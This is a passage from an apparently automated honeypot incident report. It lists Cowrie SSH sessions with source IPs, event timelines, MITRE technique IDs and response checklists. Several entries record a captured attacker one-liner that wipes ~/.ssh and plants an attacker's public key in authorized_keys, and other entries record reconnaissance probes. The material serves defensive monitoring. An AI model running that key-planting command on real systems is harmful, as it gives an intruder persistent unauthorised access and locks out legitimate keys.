| `2026-07-02 10:45:36` | `cowrie.session.params` |
| `2026-07-02 10:45:36` | `cowrie.command.input` |
| `2026-07-02 10:45:36` | `cowrie.session.file_download` |
| `2026-07-02 10:45:36` | `cowrie.log.closed` |
| `2026-07-02 10:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.88.119[.]100` to AbuseIPDB if not already reported
- [ ] Block `203.88.119[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be3f823a60bf

| Field | Detail |
|---|---|
| **Source IP** | `203.88.119[.]100` |
| **First Seen** | 2026-07-02 10:45 |
| **Last Seen** | 2026-07-02 10:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:45:36` | `cowrie.session.connect` |
| `2026-07-02 10:45:36` | `cowrie.client.version` |
| `2026-07-02 10:45:36` | `cowrie.client.kex` |
| `2026-07-02 10:45:37` | `cowrie.login.success` |
| `2026-07-02 10:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.88.119[.]100` to AbuseIPDB if not already reported
- [ ] Block `203.88.119[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2da877ba958a

| Field | Detail |
|---|---|
| **Source IP** | `203.88.119[.]100` |
| **First Seen** | 2026-07-02 10:45 |
| **Last Seen** | 2026-07-02 10:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:45:37` | `cowrie.session.connect` |
| `2026-07-02 10:45:37` | `cowrie.client.version` |
| `2026-07-02 10:45:37` | `cowrie.client.kex` |
| `2026-07-02 10:45:37` | `cowrie.login.success` |
| `2026-07-02 10:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.88.119[.]100` to AbuseIPDB if not already reported
- [ ] Block `203.88.119[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99920f69e8f9

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 10:48 |
| **Last Seen** | 2026-07-02 10:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:48:23` | `cowrie.session.connect` |
| `2026-07-02 10:48:23` | `cowrie.client.version` |
| `2026-07-02 10:48:23` | `cowrie.client.kex` |
| `2026-07-02 10:48:25` | `cowrie.login.success` |
| `2026-07-02 10:48:26` | `cowrie.session.params` |
| `2026-07-02 10:48:26` | `cowrie.command.input` |
| `2026-07-02 10:48:26` | `cowrie.log.closed` |
| `2026-07-02 10:48:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94481c7abdee

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 10:48 |
| **Last Seen** | 2026-07-02 10:48 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:48:28` | `cowrie.session.connect` |
| `2026-07-02 10:48:29` | `cowrie.client.version` |
| `2026-07-02 10:48:29` | `cowrie.client.kex` |
| `2026-07-02 10:48:35` | `cowrie.login.success` |
| `2026-07-02 10:48:38` | `cowrie.session.params` |
| `2026-07-02 10:48:38` | `cowrie.command.input` |
| `2026-07-02 10:48:40` | `cowrie.log.closed` |
| `2026-07-02 10:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0f01bff51b6

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]117` |
| **First Seen** | 2026-07-02 10:51 |
| **Last Seen** | 2026-07-02 10:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:51:48` | `cowrie.session.connect` |
| `2026-07-02 10:51:49` | `cowrie.login.success` |
| `2026-07-02 10:51:49` | `cowrie.session.params` |
| `2026-07-02 10:51:50` | `cowrie.command.input` |
| `2026-07-02 10:51:50` | `cowrie.command.input` |
| `2026-07-02 10:51:51` | `cowrie.command.input` |
| `2026-07-02 10:51:52` | `cowrie.command.input` |
| `2026-07-02 10:51:52` | `cowrie.command.failed` |
| `2026-07-02 10:51:52` | `cowrie.log.closed` |
| `2026-07-02 10:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]117` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb618673d79e

| Field | Detail |
|---|---|
| **Source IP** | `34.14.84[.]236` |
| **First Seen** | 2026-07-02 10:51 |
| **Last Seen** | 2026-07-02 10:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:51:58` | `cowrie.session.connect` |
| `2026-07-02 10:51:58` | `cowrie.login.success` |
| `2026-07-02 10:51:58` | `cowrie.session.params` |
| `2026-07-02 10:51:58` | `cowrie.command.input` |
| `2026-07-02 10:51:58` | `cowrie.command.input` |
| `2026-07-02 10:51:58` | `cowrie.command.failed` |
| `2026-07-02 10:51:58` | `cowrie.command.input` |
| `2026-07-02 10:51:58` | `cowrie.log.closed` |
| `2026-07-02 10:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.84[.]236` to AbuseIPDB if not already reported
- [ ] Block `34.14.84[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-557615a6c802

| Field | Detail |
|---|---|
| **Source IP** | `34.14.84[.]236` |
| **First Seen** | 2026-07-02 10:52 |
| **Last Seen** | 2026-07-02 10:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:52:11` | `cowrie.session.connect` |
| `2026-07-02 10:52:11` | `cowrie.login.success` |
| `2026-07-02 10:52:12` | `cowrie.session.params` |
| `2026-07-02 10:52:12` | `cowrie.command.input` |
| `2026-07-02 10:52:12` | `cowrie.command.failed` |
| `2026-07-02 10:52:14` | `cowrie.log.closed` |
| `2026-07-02 10:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.84[.]236` to AbuseIPDB if not already reported
- [ ] Block `34.14.84[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6c6d2843f35

| Field | Detail |
|---|---|
| **Source IP** | `34.14.84[.]236` |
| **First Seen** | 2026-07-02 10:52 |
| **Last Seen** | 2026-07-02 10:52 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:52:13` | `cowrie.session.connect` |
| `2026-07-02 10:52:13` | `cowrie.login.success` |
| `2026-07-02 10:52:14` | `cowrie.session.params` |
| `2026-07-02 10:52:14` | `cowrie.command.input` |
| `2026-07-02 10:52:29` | `cowrie.log.closed` |
| `2026-07-02 10:52:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.84[.]236` to AbuseIPDB if not already reported
- [ ] Block `34.14.84[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11d2c919a188

| Field | Detail |
|---|---|
| **Source IP** | `120.202.189[.]21` |
| **First Seen** | 2026-07-02 10:52 |
| **Last Seen** | 2026-07-02 10:57 |
| **Session Duration** | 305s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:52:27` | `cowrie.session.connect` |
| `2026-07-02 10:52:27` | `cowrie.client.version` |
| `2026-07-02 10:52:27` | `cowrie.client.kex` |
| `2026-07-02 10:52:32` | `cowrie.login.success` |
| `2026-07-02 10:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.202.189[.]21` to AbuseIPDB if not already reported
- [ ] Block `120.202.189[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-932858813e06

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]103` |
| **First Seen** | 2026-07-02 10:54 |
| **Last Seen** | 2026-07-02 10:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:54:24` | `cowrie.session.connect` |
| `2026-07-02 10:54:24` | `cowrie.login.success` |
| `2026-07-02 10:54:25` | `cowrie.session.params` |
| `2026-07-02 10:54:25` | `cowrie.command.input` |
| `2026-07-02 10:54:26` | `cowrie.command.input` |
| `2026-07-02 10:54:27` | `cowrie.command.input` |
| `2026-07-02 10:54:27` | `cowrie.command.input` |
| `2026-07-02 10:54:27` | `cowrie.command.failed` |
| `2026-07-02 10:54:28` | `cowrie.log.closed` |
| `2026-07-02 10:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]103` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1b532e50f30

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 10:54 |
| **Last Seen** | 2026-07-02 10:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:54:42` | `cowrie.session.connect` |
| `2026-07-02 10:54:42` | `cowrie.client.version` |
| `2026-07-02 10:54:42` | `cowrie.client.kex` |
| `2026-07-02 10:54:42` | `cowrie.login.success` |
| `2026-07-02 10:54:44` | `cowrie.session.params` |
| `2026-07-02 10:54:44` | `cowrie.command.input` |
| `2026-07-02 10:54:44` | `cowrie.log.closed` |
| `2026-07-02 10:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3de71ecd16de

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 10:57 |
| **Last Seen** | 2026-07-02 10:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:57:23` | `cowrie.session.connect` |
| `2026-07-02 10:57:23` | `cowrie.client.version` |
| `2026-07-02 10:57:23` | `cowrie.client.kex` |
| `2026-07-02 10:57:23` | `cowrie.login.success` |
| `2026-07-02 10:57:24` | `cowrie.session.params` |
| `2026-07-02 10:57:24` | `cowrie.command.input` |
| `2026-07-02 10:57:24` | `cowrie.log.closed` |
| `2026-07-02 10:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1529fbf85504

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 10:59 |
| **Last Seen** | 2026-07-02 10:59 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:59:31` | `cowrie.session.connect` |
| `2026-07-02 10:59:33` | `cowrie.client.version` |
| `2026-07-02 10:59:33` | `cowrie.client.kex` |
| `2026-07-02 10:59:39` | `cowrie.login.success` |
| `2026-07-02 10:59:43` | `cowrie.session.params` |
| `2026-07-02 10:59:43` | `cowrie.command.input` |
| `2026-07-02 10:59:44` | `cowrie.log.closed` |
| `2026-07-02 10:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-650ec6f636a8

| Field | Detail |
|---|---|
| **Source IP** | `189.146.63[.]139` |
| **First Seen** | 2026-07-02 11:01 |
| **Last Seen** | 2026-07-02 11:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:01:31` | `cowrie.session.connect` |
| `2026-07-02 11:01:31` | `cowrie.client.version` |
| `2026-07-02 11:01:31` | `cowrie.client.kex` |
| `2026-07-02 11:01:32` | `cowrie.login.success` |
| `2026-07-02 11:01:32` | `cowrie.session.params` |
| `2026-07-02 11:01:32` | `cowrie.command.input` |
| `2026-07-02 11:01:32` | `cowrie.command.failed` |
| `2026-07-02 11:01:32` | `cowrie.log.closed` |
| `2026-07-02 11:01:33` | `cowrie.session.params` |
| `2026-07-02 11:01:33` | `cowrie.command.input` |
| `2026-07-02 11:01:33` | `cowrie.session.file_download` |
| `2026-07-02 11:01:33` | `cowrie.log.closed` |
| `2026-07-02 11:01:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.146.63[.]139` to AbuseIPDB if not already reported
- [ ] Block `189.146.63[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-038175fc8bf5

| Field | Detail |
|---|---|
| **Source IP** | `189.146.63[.]139` |
| **First Seen** | 2026-07-02 11:01 |
| **Last Seen** | 2026-07-02 11:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:01:34` | `cowrie.session.connect` |
| `2026-07-02 11:01:34` | `cowrie.client.version` |
| `2026-07-02 11:01:34` | `cowrie.client.kex` |
| `2026-07-02 11:01:34` | `cowrie.login.success` |
| `2026-07-02 11:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.146.63[.]139` to AbuseIPDB if not already reported
- [ ] Block `189.146.63[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8a8f2421879

| Field | Detail |
|---|---|
| **Source IP** | `189.146.63[.]139` |
| **First Seen** | 2026-07-02 11:01 |
| **Last Seen** | 2026-07-02 11:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:01:34` | `cowrie.session.connect` |
| `2026-07-02 11:01:34` | `cowrie.client.version` |
| `2026-07-02 11:01:34` | `cowrie.client.kex` |
| `2026-07-02 11:01:35` | `cowrie.login.success` |
| `2026-07-02 11:01:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.146.63[.]139` to AbuseIPDB if not already reported
- [ ] Block `189.146.63[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25f495ac268c

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 11:02 |
| **Last Seen** | 2026-07-02 11:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:02:20` | `cowrie.session.connect` |
| `2026-07-02 11:02:21` | `cowrie.client.version` |
| `2026-07-02 11:02:21` | `cowrie.client.kex` |
| `2026-07-02 11:02:22` | `cowrie.login.success` |
| `2026-07-02 11:02:24` | `cowrie.session.params` |
| `2026-07-02 11:02:24` | `cowrie.command.input` |
| `2026-07-02 11:02:24` | `cowrie.log.closed` |
| `2026-07-02 11:02:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a6ed28a8833

| Field | Detail |
|---|---|
| **Source IP** | `103.88.76[.]27` |
| **First Seen** | 2026-07-02 11:06 |
| **Last Seen** | 2026-07-02 11:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:06:58` | `cowrie.session.connect` |
| `2026-07-02 11:06:58` | `cowrie.client.version` |
| `2026-07-02 11:06:58` | `cowrie.client.kex` |
| `2026-07-02 11:06:59` | `cowrie.login.success` |
| `2026-07-02 11:07:00` | `cowrie.session.params` |
| `2026-07-02 11:07:00` | `cowrie.command.input` |
| `2026-07-02 11:07:00` | `cowrie.command.failed` |
| `2026-07-02 11:07:01` | `cowrie.log.closed` |
| `2026-07-02 11:07:02` | `cowrie.session.params` |
| `2026-07-02 11:07:02` | `cowrie.command.input` |
| `2026-07-02 11:07:02` | `cowrie.session.file_download` |
| `2026-07-02 11:07:02` | `cowrie.log.closed` |
| `2026-07-02 11:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.88.76[.]27` to AbuseIPDB if not already reported
- [ ] Block `103.88.76[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5fd3d6e6901

| Field | Detail |
|---|---|
| **Source IP** | `103.88.76[.]27` |
| **First Seen** | 2026-07-02 11:07 |
| **Last Seen** | 2026-07-02 11:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:07:02` | `cowrie.session.connect` |
| `2026-07-02 11:07:02` | `cowrie.client.version` |
| `2026-07-02 11:07:02` | `cowrie.client.kex` |
| `2026-07-02 11:07:03` | `cowrie.login.success` |
| `2026-07-02 11:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.88.76[.]27` to AbuseIPDB if not already reported
- [ ] Block `103.88.76[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-795ef08b02f0

| Field | Detail |
|---|---|
| **Source IP** | `103.88.76[.]27` |
| **First Seen** | 2026-07-02 11:07 |
| **Last Seen** | 2026-07-02 11:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:07:04` | `cowrie.session.connect` |
| `2026-07-02 11:07:04` | `cowrie.client.version` |
| `2026-07-02 11:07:04` | `cowrie.client.kex` |
| `2026-07-02 11:07:05` | `cowrie.login.success` |
| `2026-07-02 11:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.88.76[.]27` to AbuseIPDB if not already reported
- [ ] Block `103.88.76[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b9c72e78afe

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 11:07 |
| **Last Seen** | 2026-07-02 11:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:07:39` | `cowrie.session.connect` |
| `2026-07-02 11:07:39` | `cowrie.client.version` |
| `2026-07-02 11:07:39` | `cowrie.client.kex` |
| `2026-07-02 11:07:40` | `cowrie.login.success` |
| `2026-07-02 11:07:41` | `cowrie.session.params` |
| `2026-07-02 11:07:41` | `cowrie.command.input` |
| `2026-07-02 11:07:41` | `cowrie.log.closed` |
| `2026-07-02 11:07:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ae3d8ad400e

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-07-02 11:08 |
| **Last Seen** | 2026-07-02 11:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:08:16` | `cowrie.session.connect` |
| `2026-07-02 11:08:16` | `cowrie.client.version` |
| `2026-07-02 11:08:17` | `cowrie.client.kex` |
| `2026-07-02 11:08:17` | `cowrie.login.success` |
| `2026-07-02 11:08:18` | `cowrie.session.params` |
| `2026-07-02 11:08:18` | `cowrie.command.input` |
| `2026-07-02 11:08:18` | `cowrie.command.failed` |
| `2026-07-02 11:08:18` | `cowrie.log.closed` |
| `2026-07-02 11:08:19` | `cowrie.session.params` |
| `2026-07-02 11:08:19` | `cowrie.command.input` |
| `2026-07-02 11:08:19` | `cowrie.session.file_download` |
| `2026-07-02 11:08:19` | `cowrie.log.closed` |
| `2026-07-02 11:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e0ed3de1470

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-07-02 11:08 |
| **Last Seen** | 2026-07-02 11:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:08:19` | `cowrie.session.connect` |
| `2026-07-02 11:08:19` | `cowrie.client.version` |
| `2026-07-02 11:08:19` | `cowrie.client.kex` |
| `2026-07-02 11:08:19` | `cowrie.login.success` |
| `2026-07-02 11:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aebe0f0b134

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
